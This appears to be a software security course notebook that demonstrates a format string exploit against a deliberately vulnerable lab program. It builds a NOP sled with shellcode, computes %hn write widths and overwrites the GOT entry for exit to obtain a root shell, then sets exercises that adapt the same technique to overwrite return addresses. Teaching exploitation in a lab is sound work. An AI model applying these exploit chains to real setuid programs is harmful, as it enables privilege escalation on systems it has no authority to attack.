    - exploit format string vulnerability to overwrite any address with your controlled address where the shellcode is stashed


```python
! pwd
```


```python
# find the size of exploit code
! wc -c ./shellcode_root.bin
# shellcode is 24 bytes
```


```python
# create a string that's multiple of 4; not necessary
# let's create a string of 100 bytes long 25*4
# find length of NOP sleds to make 100 bytes long exploit code including shellcode
25*4-35
```


```python
# text buffer is 1024 bytes big
! python -c 'import sys; sys.stdout.buffer.write(b"\x90"*65)' > exploit_fmt.bin
```


```python
! wc -c ./exploit_fmt.bin
```


```python
! hexdump -C exploit_fmt.bin
```


```python
# let'S append Shellcode to the exploit code after the NOP sled
! cat shellcode_root.bin >> exploit_fmt.bin
```


```python
! wc -c exploit_fmt.bin
```


```python
! hexdump -C exploit_fmt.bin
```

### Find the address of `text` buffer 
- typically found using gdb
- can't easily find the actual address of text buffer
- it shifts as we run the program with some arguments (size of the arguments matter), environment variables, program name, etc.
- see [Buffer Overflow Basics](./BufferOverflowBasics.ipynb) chapter for details
- we get different value outside the gdb
- there are workarounds but little tidious...
- for shake of learning and easiness, the address of text is printed!


```python
! ./fmt_vuln.exe $(python -c 'print("A"*50)')
# notebook gives different address than the terminal; try it!
```


```python
! ./fmt_vuln.exe $(python -c 'print("A"*200)')
# text is at different address as the argument is longer
```

### Do the following directly on a Terminal
- address of text buffer changes depending on where and how the program is run (with various length of argument) as shown above

- find the right parameter number that starts repeating the AAAA in hex (41414141)
     - try 1 2 ... n

- after trial and error 29th argument prints 41414141 (AAAA) again

```bash
┌──(kali㉿kali)-[~/…/SoftwareSecurity/demos/fmt_strings/vuln1]
└─$ ./fmt_vuln.exe $(cat exploit_fmt.bin)$(printf "AAAABBBB")%29\$x
The right way to print user-controlled input:
�����������������������������������������������������������������1�1�1ə��j
                                                                          XQh//shh/bin��Q��S��AAAABBBB%29$x

The wrong way to print user-controlled input:
�����������������������������������������������������������������1�1�1ə��j
                                                                          XQh//shh/bin��Q��S��AAAABBBB41414141

[*] test_val @ 0x0804c01c = -72 0xffffffb8
[*] text is @ 0xffffb5c0

```

- let's use test_val's address to write controlled address for testing
- now notice the address of text (`0xffffffb8`)
    - NOTE - this may shift again as we build the final string
    
- subtract 100+8 from least two bytes
    - we need to print shellcode with nop sled of size 100 (see above)
    - we need to write 2 4-byte addresses (8 bytes) to access and write to that location using %hn

```


```python
# let's calculate the address of text ...
! printf "%d" $((0xffb8-100-8))
```


```python
! printf "%d" $((0xffff-0xffb8))
```

- let's check if the address of buffer was calculated correctly by writing to test_val

```bash
┌──(kali㉿kali)-[~/…/SoftwareSecurity/demos/fmt_strings/vuln1]
└─$ ./fmt_vuln.exe $(cat exploit_fmt.bin)$(printf "\x1c\xc0\x04\x08\x1e\xc0\x04\x08")%65356x%29\$hn%71x%30\$hn

....
[*] test_val @ 0x0804c01c = -72 0xffffffb8 <---- address we wanted to write
[*] text is @ 0xffffb5b0 <---- address has changed however....!!!!!
```

### Readjust the width ...
- the text buffer's address has changed...
- recreate the exploit code and launch with the new addresses



```python
print(0xb5b0-100-8)
```


```python
0xffff-0xb5b0
```

- let's run the exploit code with the new widths and write the address to test_val

```bash
┌──(kali㉿kali)-[~/…/SoftwareSecurity/demos/fmt_strings/vuln1]
└─$ ./fmt_vuln.exe $(cat exploit_fmt.bin)$(printf "\x1c\xc0\x04\x08\x1e\xc0\x04\x08")%46404x%29\$hn%19023x%30\$hn

...

[*] test_val @ 0x0804c01c = -19024 0xffffb5b0 <---- address we wanted to write
[*] text is @ 0xffffb5b0 <--- address of text is still the same
```


```python
# find the address of exit in GOT to write to
! objdump -R ./fmt_vuln.exe | grep exit
```

- modify the string to write to the address of exit function
- run the final exploit code on Terminal

```bash
┌──(kali㉿kali)-[~/…/SoftwareSecurity/demos/fmt_strings/vuln1]
└─$ ./fmt_vuln.exe $(cat exploit_fmt.bin)$(printf "\x10\xc0\x04\x08\x12\xc0\x04\x08")%46404x%29\$hn%19023x%30\$hn

...

[*] test_val @ 0x0804c01c = -72 0xffffffb8
[*] text is @ 0xffffb5b0
# whoami                                                                                                       
root
# ls                                                                                                           
Makefile        exploit_fmt.bin  fmt_vuln.exe  getenvaddr.cpp  shellcode_root.bin
directpara.exe  fmt_vuln.cpp     fmt_vuln.o    getenvaddr.exe
#    
```

## Exercise 1
- stash your shellcode in shell environment and exploit the `format string` vulnerability in `labs/format_string/fmt_string.cpp` to execute the shellcode by modifying the return address to the address of shellcode in environment variable.

### steps:
- stash your shellcode in shell environment
- find the address of shellcode using getenvaddr program
- find the nth parameter that'll crash program

```bash
$ python -c 'print("AAAA%x%x%x%x%x%x%x")' | ./fmt_vuln2.exe 
$ python -c 'print("AAAA%x%x%x%x%x%x%7\$x")' | ./fmt_vuln2.exe
$ python -c 'print("<return address>%7\$n")' | ./fmt_vuln2.exe
$ python -c 'print("<8-byte return address>%widthx%7\$hn%widthx%8\$hn")' | ./fmt_vuln2.exe
```
- doing some math, update the return address using half-write with shellcode address

## Exercise 2
- Smuggle your `shellcode` as a part of data into the program and exploit the `format string` vulnerability in `labs/format_string/fmt_string.cpp` program found in this repo by modifying the return address to point to the exploit code.

### steps
- compile and make `labs/format_string/fmt_string.cpp` program a privileged program
- run the program to note the return address and the address of input buffer
- create an exploit file with 12 (nop sled) + 24 (shellcode) = 36 bytes it makes it easier if the total bytes is multiple of 4
```bash
$ python -c 'import sys; sys.stdout.buffer.write(b"\x90"*12)' > fmt_vuln2exploit.bin
$ cat shellcode.bin >> fmt_vuln2exploit.bin
$ wc -c fmt_vuln2exploit.bin
```
- find out the right parameter number that starts repeating AAAA in hex
```bash
$ ./fmt_vuln2.exe $(cat fmt_vuln2exploit.bin)$(printf "AAAA")%1\$x
$ ./fmt_vuln2.exe $(cat fmt_vuln2exploit.bin)$(printf "AAAA")%2\$x
$ ./fmt_vuln2.exe $(cat fmt_vuln2exploit.bin)$(printf "AAAA")%15\$x
$ ./fmt_vuln2.exe $(cat fmt_vuln2exploit.bin)$(printf "AAAA")%15\$x
```

- now find the width parameter to write the address of input buffer at the return address: let's say:
    - input is @ 0xffffc2e8
    - return address @ 0xffffc3bc
 
- find the width for the least 2 significant bytes

```bash
$ printf "%d" $((0xc2e8-36-8)) # 36 bytes is exploit code; that is printed as well. => 49852
$ printf "%d" $((0xffff-0xc2f8)) # -> 15639
```
- final exploit will look something like this...

```bash
$ ./fmt_vuln2.exe $(cat fmt_vuln2exploit.bin)$(printf "\xbc\xc3\xff\xff\xbe\xc3\xff\xff")%49852x%15\$hn%15639x%16\$hn
```


```python

```
